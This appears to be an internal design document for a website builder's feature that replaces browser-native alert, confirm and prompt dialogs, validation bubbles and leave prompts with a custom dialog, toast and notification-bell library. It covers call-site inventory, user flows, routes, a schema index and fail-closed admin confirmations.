# Custom dialogs and notifications – design

Feature: **custom-dialogs** ("Custom push ups … nicht von webbrowser"). Built on the Node.js version after the port
(`feature/node-typescript`, layout of `spec/plan.md` §2.1). PHP files are not changed: every `views/*.php`,
`lib/*.php` reference below marks the place whose Node port (`app/src/views/*.ts`, `app/src/render/*.ts`, …) changes;
`static/js/*`, `static/css/*` change directly (and stay usable by the PHP rollback until release 3.1, §11.2).

**In one paragraph:** one small dependency-free library, `static/js/ui.js` (global `OYSUI`), draws every dialog and
notice of the site. Its contract, `static/js/ui.d.ts`, is agreed with the features that use it before any code lands
(PR 0). It offers promise-based `alert/confirm/prompt/choice` with custom content and a controller for dialogs that run
requests, toasts and server notices with a queue, a layer stack (focus trap, Escape and Back gesture, ARIA, no scroll
jump), one global handler that replaces the browser's validation bubbles on every form, declarative and conditional
confirmations for server forms that **fail closed** (the server refuses an unconfirmed form), and a leave guard that
also covers code navigations. The editor keeps unsaved work as a local draft. App pages use the editor's dark look
(`static/css/ui.css`); public pages use the page's theme (`static/css/page.css`); layout rules shared by both are
injected by `ui.js`. "For everything" is an event catalogue (toast, bell, email), a `notify()` core that every feature
uses (PR 5a, no dependencies), and one account-level bell in the editor **and** the admin header. One additive index;
no rows are deleted unless the owner enables retention.

---

## 1. Goal and requirement

> „… außerdem soll im beeich Honeycombs nun noch mehr möglichkeiten geben **und ich will das es für alles Custom push ups
> gibt und nicht von webbrowser.**"

Brief note: "Custom push ups" means custom pop-ups – the site's own dialogs and notifications instead of the browser's
`alert()/confirm()/prompt()`.

Interpretation (where the wording is open):

1. **"Custom pop-ups"** – every pop-up the site causes is drawn by OnYourSite in its own design: confirmations,
   questions, messages, form errors and notices.
2. **"für alles" (for everything)** has two meanings and both are covered:
   - *every place*: a complete inventory (§2) and a plan for every call site (§7);
   - *every event the user should notice*: a defined path per event – toast in the open tab, the notification bell,
     email where it exists today or the owner decides (§5.8, Q4).
3. **"nicht vom Webbrowser"** – no `alert/confirm/prompt`, no validation bubbles, and also no Web Push / Notification
   API (those are browser pop-ups too). What remains, and why:
   - `beforeunload` when the tab is closed, reloaded or left with the Back button: pages cannot replace that dialog.
     Every in-app navigation (links, logout, page switch, page creation, session dialogs) gets our own dialog instead,
     unsaved work is also kept as a local draft (§6.11), and Q6 asks the owner whether the browser dialog can then be
     dropped completely.
   - **Users' live code pages** (their own website on their own address, sandboxed): their scripts may keep calling
     `alert()` there (Q1). Inside the editor, the code page **preview no longer allows browser dialogs**: they would
     appear over on-your.site/dashboard (§8).
4. OS pickers (file, colour, date), the system share sheet, `mailto:` and native tooltips are not pop-ups in this
   sense and stay.
5. **Look stays**: app pages use the editor's modal and toast look (`static/css/editor.css:282-316`); profile pages use
   the look of the existing password / 18+ / share dialog in the page's theme (`static/css/page.css:592-626`).
   Honeycomb notices become yellow (brief).

---

## 2. Inventory of browser-native pop-ups

### 2.1 `alert()`, `confirm()`, `prompt()` – 20 calls, 19 in the site's own UI

| # | File:line | Native call (today's text) | Kind |
|---|---|---|---|
| 1 | `static/js/editor.js:577` | `confirm('You have unsaved changes. Switch pages anyway?')` | page switch |
| 2 | `static/js/editor.js:1148` | `confirm('This looks like YouTube. Embed it right on your page? (Cancel = add it as a normal link)')` | 2-way choice misusing OK/Cancel |
| 3 | `static/js/editor.js:1576` | `confirm('Delete this block?')` | local delete |
| 4 | `static/js/editor.js:2093` | `confirm('Delete this message?')` | server delete |
| 5 | `static/js/editor.js:2099` | `confirm('Delete this booking request?')` | server delete |
| 6 | `static/js/editor.js:2502` | `confirm('Delete about.html? It’s removed from your page when you save.')` | code page file |
| 7 | `static/js/editor.js:2583` | `confirm('Move your code page to x.on-your.site? The old address stops working right away.')` | code page address |
| 8 | `static/js/editor.js:2777` | `prompt('Delete page “x” …\nType the address to confirm: x')` | type-to-confirm |
| 9 | `views/admin.php:439` | `onsubmit="return confirm(this.dataset.confirm)"` – "Log in as NAME?" | impersonation |
| 10 | `views/admin.php:449` | `confirm('Change admin privileges for this user?')` | role |
| 11 | `views/admin.php:454` | `confirm('WARNING: … completely delete this user …')` | delete user |
| 12 | `views/admin.php:532` | `onclick="return confirm('Are you sure you want to queue this email?')"` on the submit button | newsletter |
| 13 | `views/admin_updates.php:141` | `confirm('Delete this update[ and its Discord post]?')` | delete |
| 14 | `views/admin_updates.php:226` | `confirm('Remove this task?')` | delete |
| 15 | `views/admin_updates.php:248` | `confirm('Delete this milestone and its tasks?')` | delete |
| 16 | `views/admin_updates.php:270` | `confirm('Disconnect Discord? Saved links and tokens are removed.')` | disconnect |
| 17 | `views/admin_community.php:152` | `onclick="return confirm('Close this ticket?')"` on a submit button with `name/value` | close ticket |
| 18 | `views/admin_honeycombs.php:123` | `confirm('Block this code page? Visitors will only see a notice.')` | block |
| 19 | `views/admin_honeycombs.php:156` | `confirm('Unlock the code page for this user for free?')` | grant |
| 20 | `lib/codesites.php:117` | `alert('Hello from your own website!')` in the **starter `script.js`** of new code pages | user content |

Checked and free of native dialogs: `static/js/page.js`, `static/js/share.js`, all other views, `lib/render.php`,
`lib/routes_public.php`, the bundled CodeMirror (`static/vendor/codemirror/codemirror.js` has no search addon, so no
`prompt()` fallback).

### 2.2 Other browser-native pop-ups

**`beforeunload`** – `static/js/editor.js:408-411` ("Leave site?" when the page or code page has unsaved changes).
Today it also fires for in-app navigations: logout (`views/dashboard.php:101`), "Back to admin panel"
(`views/dashboard.php:76`), the account forms (`views/dashboard.php:158,167`), the logo and admin links (`:84,99`), and
two code navigations that set `dirty = false` first: creating a page (`editor.js:711`, so unsaved **code** still
triggers the browser dialog and unsaved **page** edits are dropped without a word) and the page-delete redirect
(`:2781-2782`). Only the page switch (#1) asks first and sets `leaving` (`editor.js:408,578`).

**Validation bubbles** – forms with `required`/`type`/`min`/`max`/`minlength` and without `novalidate` (15 forms, 33
fields). The browser shows "Please fill out this field." etc.:

| Form | Fields (file:line) |
|---|---|
| Login | `views/login.php:68` email, `:73` password |
| Register | `views/register.php:71` address, `:79` name, `:84` email, `:89` password (minlength 8) |
| Change email / password (editor settings) | `views/dashboard.php:163,164` / `:171,172,173` |
| Admin newsletter / SMTP | `views/admin.php:493` template (select), `:522` single email / `:576` from email |
| Admin reset password (own modal) | `views/admin.php:613` |
| Admin update / milestone / Discord | `views/admin_updates.php:51,68` (date max) / `:164` / `:302,324` (url) |
| Admin give honeycombs / earn rules | `views/admin_honeycombs.php:48,58` / `:81` (5 number inputs from a loop) |
| Booking page | `views/kalender.php:80,81,83,85` |
| Protected-link gate page | `lib/routes_public.php:74` |
| Protected-link dialog on profile pages | `static/js/page.js:155` (`required` inside the JS-built form – the bubble shows before the submit handler runs) |

Already custom: the public contact form has `novalidate` (`lib/render.php:526`) and one generic message
(`static/js/page.js:298-302`). The editor has no `<form>` elements, so no bubbles there. The other five designs add
more forms with such fields (status-pages' subscribe form, honeycomb-shop's admin dates and numbers, premium-domains'
domain input); §6.7 covers them without any per-form opt-in.

**Browser dialogs from the code page preview** – both preview iframes allow modals (`views/dashboard.php:197`,
`static/js/editor.js:2625`). Any `alert()/confirm()/prompt()` in a user's `script.js` – including our own starter
(#20) – opens a browser dialog over the editor at on-your.site/dashboard (§8 shows how that is abused).

**Browser "Save page as"** – `Ctrl+S` inside an open editor modal: the handler at `editor.js:412-415` always calls
`save()`; after this change it must still `preventDefault()` while a dialog is open (§7.1).

### 2.3 Own dialogs and notices that exist today (reused, but incomplete)

| What | Where | Missing |
|---|---|---|
| Editor modal `#modal` (new page, add block, icons, share, crop, unlock, code file, honeycombs) | `views/dashboard.php:231`, `editor.js:675-690` | `role=dialog`, `aria-modal`, label, focus trap, focus restore; Escape closes everything (`editor.js:414`) |
| Editor toasts `#toasts` + `toast()` | `views/dashboard.php:232`, `editor.js:55-60`, `editor.css:311-316,429` | live region, pause, close, title/amount/action, queue, honeycomb colour (indigo today) |
| Bell | `views/dashboard.php:120-126`, `editor.js:641-670,2871-2872` | links, types, only polls when a page exists (the API needs a page: `lib/routes_app.php:365-367` before `:514`); no bell on the admin page (`views/admin.php:340-349`) |
| Profile-page dialog `#oys-modal` (share, password, 18+) | `lib/render.php:204-209`, `page.js:51-75` | focus trap, scroll lock, max height (`page.css:594`) |
| Gallery lightbox | `page.js:273-281` | Escape, keyboard close, dialog role |
| Admin reset-password modal `#pwdModal` | `views/admin.php:601-621,694-699`; opened by inline `onclick` with `addslashes` (`:447`) | Escape, focus trap, ARIA, validation bubble |
| Admin flash banners | `views/admin.php:351-360`, script `:648-652` | live region; look differs slightly from toasts |
| Auth flash banners (form-level) | `views/login.php`, `views/register.php` | fine – they stay (inline, next to the form) |
| Editor large / mobile preview overlays | `views/dashboard.php:217-229` | Escape |

### 2.4 Kept native on purpose

File pickers (`editor.js:126-135`), `<input type=color>` / `<input type=date>` pickers, the share sheet
(`page.js:99,113`), clipboard (`share.js:89-103`), `mailto:` links, `title` tooltips, and the **live** code page's CSP
`allow-modals` (`lib/codesites.php:16`, sent at `:243`) – user code on its own origin, owner question Q1. The editor's
preview iframes lose `allow-modals` (§7.1 row 20).

---

## 3. User stories and flows

### 3.1 Users in the editor

- **Delete a block.** Click the bin → dialog "Delete this block?" (red icon, *Cancel* focused) → *Delete* removes it
  (as today, it is saved with the next *Save*); *Cancel*, Escape, ✕, the Back gesture or a click on the backdrop keep
  it. Keyboard only: Tab cycles inside the dialog; focus returns to the block list. If a save finishes while the
  dialog is open, *Delete* still removes the right block (§7.1, re-check rule).
- **Quick-add a YouTube/Twitch/Spotify link.** Dialog "Embed this YouTube link?" with *Add as link* and *Embed it*.
  ✕/Escape cancels: nothing is added and the URL stays in the field (today Cancel meant "add as link").
- **Switch pages, create a page or leave with unsaved changes.** Page menu, page dots, *Edit* in settings, *Create
  page*, logout, "Back to admin panel", the account forms, logo/admin links → "Leave without saving?" (*Stay* focused,
  *Leave without saving* red). Choosing to leave discards the changes and their local draft. `mailto:` links (*Reply*,
  a booking's e-mail address) open the mail app without any question and without switching the protection off. Closing
  or reloading the tab, or Back out of the editor, still shows the browser's own dialog while Q6 is open (iOS Safari
  shows none – the draft keeps the work).
- **Delete a page.** Dialog with the explanation and a field "Type mia to confirm"; *Delete page* is disabled until
  the address matches (the field lower-cases and strips like other address fields). The request runs inside the
  dialog (spinner); a server error ("You can’t delete your last page.") appears in the dialog, which stays open.
- **Delete a message or booking.** Dialog names the sender / date; the delete request runs inside the dialog; success
  → toast "Message deleted." and the inbox reloads. This also works when no link page is shown (§5.3).
- **Code page.** Delete a file / move the address → own dialogs with the same texts as today. Pop-ups of the user's
  own code do not open in the editor preview; a hint under the preview says "Pop-ups like alert() only run on your
  live page."
- **Something happens while the editor is open** (new message, booking, gift from the team, unlock ending, domain
  ready …): within a minute (or immediately when the tab becomes visible again) the bell badge rises, the bell rings
  (existing animation) and a toast with the type's icon appears; clicking the toast or the bell item opens the target
  (inbox tab, honeycomb tab, code tab …) and marks the item read. While a dialog is open, a toast click only dismisses
  it; a toast with a link waits until the dialog is closed. A new message also refreshes the open inbox.
- **Session problems.** 401 → dialog "You’re logged out" (*Close* / *Log in*). *Close* leaves the editor usable (text
  can be copied) and keeps a sticky toast "You’re logged out." with *Log in*. Unsaved changes are kept in the browser
  and offered after logging in. 419 → "Your session has expired" (*Close* / *Reload*). 409/400 with `reload:true` →
  "Reload the editor" with the server's text. Shown once, not per request; no browser dialog follows.
- **Unsaved work after a crash, a closed tab or an expired session.** On the next visit to the same page (or when the
  code tab loads): dialog "Restore unsaved changes?" with the time; *Restore* puts the changes back (not saved yet,
  passwords of protected links must be entered again), *Discard* deletes the draft.
- **Offline.** Sticky amber toast "You’re offline. Keep this tab open and save again when you’re back online."; when
  the connection returns it closes and "Back online." appears.

### 3.2 Visitors on profile pages (themed)

- **Protected link.** The existing themed dialog gains a focus trap and scroll lock; empty password → "Please enter
  the password." under the field (no request, no bubble); wrong password → today's inline error.
- **Contact form.** Errors appear under each field in the theme ("Please enter a valid email address.", "Your
  message is a bit short." – the server's wording); server errors keep using the status line.
- **Booking page and gate page** (simple pages, `lib/render.php:547-563`): same inline field errors.
- **Gallery lightbox**: Escape and a close button close it; focus returns to the image.
- Opening and closing any dialog keeps the scroll position (no jump to the top, no sideways shift); long dialogs
  scroll inside.

### 3.3 Admins

- Every destructive or consequential admin form (§7.2) asks with an own dialog; *Cancel* sends nothing. The ticket
  "Close" button still sends `community_action=ticket_close` (the submitter is preserved). If the dialog library did
  not load, these forms change nothing: the server answers "Nothing was changed. Please confirm in the dialog – if no
  dialog appears, reload the page." (§5.6).
- After confirming, the form's buttons stay disabled until the next page load, so a second click cannot send the
  newsletter twice. The newsletter dialog names the audience, or for "Test / Single User" the address.
- Flash results ("User successfully deleted.") appear as toasts at the top: success hides after 5 s, errors stay until
  closed – the same rules as today's banners (`views/admin.php:648-652`). Without `ui.js` the banners stay as today.
- The bell is also in the admin header. Team alerts (honeycomb-shop's integrity checks, the status watchdog, …) link
  to the admin tab they concern.
- Reset password: the existing modal gets Escape, focus trap and inline validation.

### 3.4 Sign-up, login, account forms

- Missing or invalid fields → inline red text under the field, the field gets a red border, focus moves to the first
  error. Texts match the server's existing messages (e.g. "Your password must be at least 8 characters long.",
  "The new passwords don’t match."). Server-side checks stay unchanged and remain the authority.

### 3.5 Empty, error and limit states

| Case | Behaviour |
|---|---|
| Bell empty | "Nothing new yet." (unchanged) |
| No page yet / no shown link page (code-slots-admin) | The bell, messages and bookings work (account-level, §5.3) |
| Request inside a dialog fails | Error text in the dialog (`role=alert`), buttons re-enabled, dialog stays |
| Request throws / no connection | "No connection to the server." in the dialog or as toast (existing text) |
| Many toasts | At most 4 visible; further toasts wait in a queue – none is dropped; identical text+tone within 2 s refreshes the existing toast |
| Many notices at once (first visit of the day) | Shown 700 ms apart (as today); a batch of more than 6 shows 5 and one "+N more" toast that links to the history |
| Many new bell items at once | At most 3 toasts, then one "+N more notifications" toast that opens the bell |
| Long texts | Toast text cut at 300 characters; dialog at most `min(86vh, 86dvh)` high, its body scrolls |
| Stacked dialogs (confirm over the honeycomb window) | Escape / Back closes only the top one; up to 5 layers; a 6th dialog is answered as *Cancel* |
| Toast clicked while a dialog is open or busy | Only dismisses; its link or action waits until the dialogs are closed |
| `ui.js` fails to load | Editor: until 3.1 today's browser dialogs (legacy adapter, §11.2); after 3.1 an in-page notice "The editor couldn’t load completely. Please reload the page." and no editing. Admin: forms with a confirmation are refused by the server (§5.6), banners stay. Profile pages: today's behaviour |
| Browser storage unavailable or full | No draft; the browser's leave dialog stays the safety net |
| Text input with an IME (Japanese, Chinese …) | Enter and Escape while composing neither submit nor close |
| Reduced motion | No animations |

---

## 4. Data model

### 4.1 Migration (next free schema version)

`plan.md` §0 item 4 reserves **v6** for the Wave 3 pages + Discord work. This feature takes the next free number at
merge time (in PR 5a). Additive only – one index, no new columns:

```sql
ALTER TABLE notifications ADD KEY idx_user_id (user_id, id);   -- Glocke: neueste zuerst, „gelesen bis id“
```

In `app/src/schema.ts` (`if (version < N) await migrateNotifications(conn);`, `SCHEMA_VERSION = N`):

```ts
// N: Index für die Glocke (neueste zuerst und „bis hier gelesen“)
async function migrateNotifications(conn: PoolConnection): Promise<void> {
  if (!(await rows(conn, "SHOW INDEX FROM notifications WHERE Key_name = 'idx_user_id'")).length) {
    await run(conn, 'ALTER TABLE notifications ADD KEY idx_user_id (user_id, id)');
  }
}
```

The existing `idx_user (user_id, is_read)` (`app/src/schema.ts:237`) stays for the unread count. If code-slots-admin's
`addIndex()` helper has landed by then, the step uses it. `ADD KEY` is an online operation in MariaDB.

### 4.2 `oys_meta`

No new settings. Retention is not part of this design's base PRs; if the owner wants it (Q5), the optional PR 6 adds
`notifications_retention` (§5.7).

### 4.3 Existing data

Existing rows keep working: `type` 'message'/'booking' are in the catalogue; their stored `link`
(`/dashboard#messages`, `lib/spam.php:94`, `views/kalender.php:40`) is now returned and used. No data is rewritten or
deleted. PHP (kept for rollback, `plan.md` §5.6) does not notice the index.

---

## 5. Server

### 5.1 Module layout

| File | New / changed | Content |
|---|---|---|
| `app/src/notify/types.ts` | new | `NOTIFY_TYPES` catalogue, `Tone`, `Notice`, `notice()` (cuts and checks a notice) |
| `app/src/notify/notify.ts` | new | `notify()`, `notifyAdmins()`, `safeLink()` – the only code that writes `notifications` |
| `app/src/notify/bell.ts` | new | `bellList(userId)`, `bellRead(ctx, userId, {id \| upTo})` |
| `app/src/views/partials/ui.ts` | new | `uiAssets(skin)` (asset tags), `confirmAttrs(o)` + `confirmField()` (§6.8), `flashBanner(ctx, keys)` (§5.5), `bellMarkup(ctx)` |
| `app/src/public/contact.ts`, `app/src/public/kalender.ts` | changed | the ported `notify` (from `lib/spam.php:115-119`) delegates to `notify/notify.ts` |
| `app/src/app/editorApi.ts` | changed | `notifications`, `notifications-read`, `messages`, `message`, `booking-delete` before the page check (§5.3) |
| `app/src/admin/page.ts`, `app/src/app/impersonate.ts` | changed | the `_confirmed` check (§5.6); admin header bell; flash banners with `data-flash` |
| `app/src/schema.ts` | changed | migration §4.1 |
| `app/src/views/*.ts`, `app/src/render/page.ts`, `render/simple.ts` | changed | asset tags, `confirmAttrs`, custom error texts (§7) |
| `tools/check-native-dialogs.mjs` | new | lint rules (§7.5) |

### 5.2 `notify()` and the type catalogue

```ts
// Benachrichtigungen für die Glocke (früher oys_notify in lib/spam.php) – die einzige Stelle, die notifications schreibt
export async function notify(userId: number, type: string, title: string, body = '', link = '',
  opts: { db?: Queryable } = {}): Promise<void>;
export async function notifyAdmins(type: string, title: string, body = '', link = '',
  opts: { db?: Queryable } = {}): Promise<number>;          // je Admin eine Zeile; Rückgabe: Anzahl
export function safeLink(link: string): string;             // nur eigene relative Pfade, sonst ''
```

- Same row shape as `oys_notify` (`map-core.md` §8): `title = mbSubstr(title, 0, 190)`, `body = mbSubstr(body, 0, 255)`,
  `link = safeLink(link)`, `is_read 0`, `created_at` local time. `body = ''` stays `''` (as today).
- `opts.db`: a connection or transaction – for migrations (discord-pages moves `suggestions` pages and tells the
  owners) and for jobs that write inside their own transaction. Default: the pool.
- **No de-duplication here.** Every job already keeps its own idempotency state (honeycomb-shop `reminded` /
  `expiry_done_at`, premium-domains' state machine, status-pages' outbox) and calls `notify()` once per state change.
- `safeLink`: accepts `^/(?!/)[A-Za-z0-9/_.~%#?=&-]*$` with at most 255 bytes; anything else (`//host`, `https://…`,
  `javascript:`, backslashes such as `/\evil.example`, control characters) becomes `''`. The client uses the same rule
  (§6.10).
- Unknown `type` → stored as given (`VARCHAR(24)`), shown with the prefix row or the bell icon.

Catalogue (`notify/types.ts`). The rows for the other five designs ship in PR 5a, so their icons are right from the
start; they may adjust their rows in their own PRs. Lookup: exact type → the part before the first `_` → default.

```ts
// Typ → Symbol (Boxicons), Farbe, Standard-Ziel in der Glocke
export const NOTIFY_TYPES: Record<string, { icon: string; tone: Tone; link: string }> = {
  message:        { icon: 'bx-envelope',       tone: 'info', link: '/dashboard#messages' },
  booking:        { icon: 'bx-calendar-check', tone: 'info', link: '/dashboard#messages' },
  honeycombs:     { icon: 'bx-hive',           tone: 'hc',   link: '/dashboard#honeycombs' },  // honeycomb-shop: Geschenke, Erstattungen
  unlock:         { icon: 'bx-hive',           tone: 'hc',   link: '/dashboard#honeycombs' },  // honeycomb-shop: endet bald / beendet
  code:           { icon: 'bx-code-alt',       tone: 'warn', link: '/dashboard#code' },        // code-slots-admin
  domain:         { icon: 'bx-globe',          tone: 'info', link: '/dashboard#settings' },    // premium-domains (Präfix)
  domain_live:    { icon: 'bx-globe',          tone: 'ok',   link: '/dashboard#settings' },
  domain_back:    { icon: 'bx-globe',          tone: 'ok',   link: '/dashboard#settings' },
  domain_problem: { icon: 'bx-globe',          tone: 'warn', link: '/dashboard#settings' },
  domain_paused:  { icon: 'bx-globe',          tone: 'warn', link: '/dashboard#settings' },
  domain_removed: { icon: 'bx-globe',          tone: 'warn', link: '/dashboard#settings' },
  status:         { icon: 'bx-pulse',          tone: 'warn', link: '/dashboard#status' },      // status-pages
  team:           { icon: 'bx-shield-quarter', tone: 'warn', link: '/admin' },                 // nur über notifyAdmins()
  system:         { icon: 'bx-bell',           tone: 'info', link: '' },
};
export type Tone = 'ok' | 'info' | 'warn' | 'err' | 'hc';
export interface Notice { tone: Tone; text: string; title?: string; amount?: number; action?: { label: string; link: string } }
```

### 5.3 Routes (editor API, all existing paths)

These actions move **before** the "Create a page first." check (`lib/routes_app.php:365-367`), next to `honeycombs`
(`:245`): notifications, messages and bookings belong to the account, not to a page. Their SQL already filters by
`user_id` (`:467`, `:498-505`, `:509-511`, `:514-534`), so nothing else changes. This keeps bell links working in
code-slots-admin's "No shown link page" state. Auth and CSRF stay as today (`lib/routes_app.php:189-195`: 401 JSON
when logged out; `:216-218`: 419 on a bad CSRF token for POST).

**`GET /dashboard/api/notifications`** – unchanged keys first, new keys appended (additive JSON):

```json
{"ok":true,"unread":2,"messages_unread":1,
 "items":[{"id":81,"type":"honeycombs","title":"You received 50 honeycombs","body":"Thanks for your feedback!",
           "read":false,"ago":"2 minutes ago","link":"/dashboard#honeycombs","icon":"bx-hive","tone":"hc"}],
 "latest":81}
```

SQL: `SELECT id, type, title, body, link, is_read, created_at FROM notifications WHERE user_id = ? ORDER BY id DESC
LIMIT 15` (uses `idx_user_id`) plus the two existing `COUNT(*)` queries. `link` = `safeLink(row.link)` or the type's
default; `icon`/`tone` from the catalogue (unknown → `bx-bell`/`info`); `latest` = first item's id or 0.

**`POST /dashboard/api/notifications-read`** – body `{"id": 81}` (one) or `{"upTo": 81}` (everything up to the
newest item the user has seen). `{}` still marks all, only for editor tabs that were opened before the deploy.
- `id` / `upTo` must be positive integers, otherwise `{"ok":false,"error":"Unknown notification."}` 400.
- `UPDATE notifications SET is_read = 1 WHERE user_id = ? AND id = ?` / `… AND id <= ?` – a notification that
  arrives between the last poll and the click stays unread.
- While an admin impersonates the user (`original_admin_id` in the session) nothing is written and the answer is
  `{"ok":true,"readonly":true}` – the user still sees their unread items afterwards.

`messages`, `message`, `booking-delete`: unchanged requests and answers, now also without a shown page.

The admin page uses the same two notification endpoints (`/admin` is only for admins; the bell sends the CSRF token
from `data-csrf` as `X-CSRF-Token`). `editor data` (`OYS_EDITOR.user`, `views/dashboard.php:36-42`) gains `id` (for
the per-user keys in browser storage, §6.10, §6.11).

### 5.4 Notices in JSON answers (convention for all features)

- Any editor-API JSON answer may carry a **top-level** `notices: Notice[]` (max 3, server-generated, `text` ≤ 200 and
  `title` ≤ 80 characters, `action.link` through `safeLink`). `notice()` in `notify/types.ts` cuts and checks them.
- The bootstrap of `GET /dashboard` may carry `notices` (max 12) for what happened since the last visit – this is
  where honeycomb-shop's daily rewards and gifts go (`OYS_EDITOR.notices`).
- **Only** the client's shared response handler (`OYSUI.handle()`, called by the editor's `request()`, `bell.js` and
  other feature scripts) and the editor's start code show notices, through `OYSUI.notices()`. Feature code never
  renders them itself, so nothing appears twice.
- `amount` is a signed number of honeycombs, shown as a badge ("+50" with the hive icon); `text` then does not repeat
  it ("for being active today"). `action.link` uses deep links (`/dashboard#honeycombs/premium`, §6.10).
- Use notices for results of the user's **own** action in that request (a purchase, a reward earned by saving) and
  for things since the last visit; use `notify()` for things that happen without the user (admins, jobs, visitors).
  Existing `warnings` on `save` stay as they are (`editor.js:402`).

### 5.5 Flash messages on full-page forms

- **Editor:** unchanged. The Node view renders `window.OYS_FLASH` exactly like `views/dashboard.php:235-237`;
  `editor.js:2849-2852` shows it through the shared toast. (Keeping this channel also keeps the PHP rollback working.)
- **Admin:** `flashBanner(ctx, ['admin_success', 'admin_error'])` renders today's banner markup
  (`views/admin.php:351-360`) plus `data-flash="ok|err"` and `role="status"`/`role="alert"`. `ui.js` turns every
  `[data-flash]` banner into a toast (ok 5 s, err sticky) and removes the banner. The existing banner script
  (`:648-652`) stays, so without `ui.js` the banners behave as today.
- Login and register keep their inline banners.

### 5.6 Server-checked confirmations (fail closed)

`confirmAttrs()` renders the confirmation attributes (§6.8) and `confirmField()` a hidden
`<input type="hidden" name="_confirmed" value="0" autocomplete="off">` in the same form. `ui.js` sets it to `1` only
after the dialog was answered with OK (or a `beforeSubmit` handler decided that no question is needed). The admin POST
dispatcher (`app/src/admin/page.ts`) and the impersonation route (`app/src/app/impersonate.ts`) check it before any
handler runs:

```ts
// Formulare mit eigenem Bestätigungsdialog: ohne „1“ wird nichts ausgeführt (fällt ui.js aus, passiert nichts)
if (post._confirmed !== undefined && post._confirmed !== '1') {
  ctx.session.set('admin_error', 'Nothing was changed. Please confirm in the dialog – if no dialog appears, reload the page.');
  return redirect(ctx, adminBackUrl(post));
}
```

Forms without the field are unaffected. A crafted request can of course send `1` – this is a guard against a broken
page, not an access control (that stays: admin session + CSRF). Features that add confirmed admin forms
(honeycomb-shop, code-slots-admin, premium-domains, status-pages, discord-pages) get the same protection by using
`confirmAttrs()`/`confirmField()`.

### 5.7 Retention (optional PR 6, only after the owner agrees – Q5)

Nothing is deleted by this design's base PRs. If the owner answers Q5 with yes, PR 6 adds:
- `oys_meta` key `notifications_retention`: `{"enabled": false, "readDays": 90, "allDays": 365, "keepRead": 200}`
  (admin can switch it on; off by default even after the PR).
- A nightly step registered in **one shared job runner** – not an own systemd unit. Today every feature brings its
  own timer (honeycomb-shop `honeycombs:tick` every 15 min with a nightly step, premium-domains `domains:tick`,
  status-pages' worker). Proposal: `app/src/jobs/registry.ts` (`registerNightly(name, fn)`), run from the nightly
  step that honeycomb-shop's tick already has (`honeycomb-shop.md` §4.13 step 6); the first of those features to merge
  creates the registry.
- SQL (unread rows are only removed after `allDays`; the cap only removes read rows):

```sql
DELETE FROM notifications WHERE is_read = 1 AND created_at < ?;                 -- jetzt − readDays
DELETE FROM notifications WHERE created_at < ?;                                 -- jetzt − allDays
DELETE n FROM notifications n JOIN (
  SELECT id FROM (SELECT id, ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY id DESC) AS rn
                  FROM notifications WHERE is_read = 1) r WHERE r.rn > ?
) d ON d.id = n.id;                                                             -- höchstens keepRead gelesene je Konto
```

### 5.8 "For everything": which event reaches the user how

Rule: **a toast confirms what you just did; the bell records what happened to you; email only where it exists today
or where the owner decides (Q4).** No browser notifications.

| Event | Raised by | Toast in the open tab | Bell (`type`) | Email |
|---|---|---|---|---|
| Saved, nothing to save, uploads, copies, settings changed | editor (existing toasts) | yes (ok/info) | – | – |
| Error from the user's own action (save failed, upload too big, rate limit) | editor (existing) | yes (err) | – | – |
| Session expired / logged out / page changed elsewhere | `OYSUI.handle()` | dialog (+ sticky toast after *Close*) | – | – |
| Offline / back online | editor | sticky warn / info | – | – |
| Honeycombs earned on opening the editor (daily, streak, profile, views …) | honeycomb-shop, bootstrap `notices` | yes (hc, queued) | – (history in the honeycomb tab) | – |
| Honeycombs spent (unlock, purchase), code redeemed | own action, `notices` | yes (hc) | – | – |
| Honeycombs given, taken or refunded by the team; referral paid | honeycomb-shop | when the poll sees it (and next visit's notices) | `honeycombs` | – |
| Unlock / Premium ending soon, ended, renewal failed | honeycomb-shop job | when polled | `unlock` | Q4 (honeycomb-shop's proposal: one mail 3 days before, one at the end, can be turned off) |
| Code page blocked / unblocked / deleted, code pages turned off | code-slots-admin | when polled | `code` | Q4 |
| Custom domain live / back / problem / paused / removed | premium-domains | when polled | `domain_*` | premium-domains: yes, at most once per domain per 24 h (Q4) |
| Status monitor down / up, heartbeat, certificate | status-pages | when polled | `status` | the module's own alert channels |
| New contact message | existing (`lib/spam.php:94`) | when polled; inbox refreshes | `message` | page setting `notify_email` (existing) |
| New booking request | existing (`views/kalender.php:40`) | when polled | `booking` | yes (existing) |
| Your page address changed by a migration (`suggestions` reserved) | discord-pages | when polled | `system` | – |
| Something needs an admin (honeycomb integrity check, status watchdog, …) | honeycomb-shop, status-pages | in the editor and the admin header | `team` / `status` via `notifyAdmins()` | the feature's own rules |
| Admin form results | admin | yes (flash → toast) | – | – |
| Visitor actions (message sent, wrong password, booking sent) | profile pages | inline in the themed form | – | – |

---

## 6. UI: the library

### 6.1 Files and loading

| File | Size budget | Loaded on |
|---|---|---|
| `static/js/ui.d.ts` (new, PR 0) | – | not loaded; the reviewed contract (§6.2) |
| `static/js/ui.js` (new) | ≤ 24 KB source, ≈ 8 KB gzip, ES5 style like `editor.js`, no build step | every page: landing, updates/roadmap/suggestions, login, register, dashboard, admin, 404, legal pages, profile pages, simple pages (booking, gate), status pages |
| `static/js/bell.js` (new, PR 5b) | ≈ 4 KB | dashboard and admin |
| `static/css/ui.css` (new) | ≈ 3 KB | all app pages (not profile, simple or public status pages) |
| `static/css/page.css` (changed) | + ≈ 1.5 KB | profile, simple and public status pages (theme skin, grouped with the existing `.oys-modal` rules) |

Tags come from `uiAssets()` with `asset()` versions (`?v=`): `<link rel="stylesheet" href="/static/css/ui.css?v=…">`
and `<script src="/static/js/ui.js?v=…" defer></script>` in `<head>`. On profile pages only the script, placed before
`page.js` (`lib/render.php:212`; both `defer`, so order is kept). **Rule:** scripts that use `OYSUI` are `defer`
(`editor.js`, `share.js` at `views/dashboard.php:238-239` get `defer`; `window.OYS_EDITOR` is defined before them) or
run after `DOMContentLoaded` (inline page scripts, e.g. the admin's).

`ui.js` injects one small skin-neutral `<style id="oys-ui-base">` as the first child of `<head>` (§6.4): stack
positions, scroll lock, toast container, scrolling dialog body, reduced motion. So the themed pages, which do not load
`ui.css`, get the same behaviour; the skins only carry the look.

Why not `<dialog>`/popover: the existing modals are `div`s, toasts must stay announced and visible above dialogs
(top-layer order fights), and Chrome's close-watcher grouping makes repeated Escape on stacked `<dialog>`s
unreliable. One `div` stack with `inert` gives the same accessibility with predictable behaviour.

### 6.2 API contract (`static/js/ui.d.ts`)

